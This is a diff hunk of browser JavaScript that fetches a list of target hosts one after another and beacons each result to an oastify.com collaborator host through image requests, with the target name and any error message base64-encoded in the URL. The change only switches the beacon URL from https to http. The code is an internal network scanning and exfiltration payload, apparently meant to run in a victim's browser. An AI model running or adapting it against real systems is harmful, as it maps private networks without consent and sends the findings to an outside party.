@@ -13,11 +13,11 @@ targets.forEach((target, i) => {
         fetch(`http://${target}/`)
             .then(() => {
                 const img = new Image();
-                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?reachable_${i}=` + btoa(target);
+                img.src = `http://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?reachable_${i}=` + btoa(target);
             })
             .catch(err => {
                 const img = new Image();
-                img.src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?unreachable_${i}=` + btoa(target + ': ' + err.toString());
+                img.src = `http://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?unreachable_${i}=` + btoa(target + ': ' + err.toString());
             });
     }, i * 2000);
 });
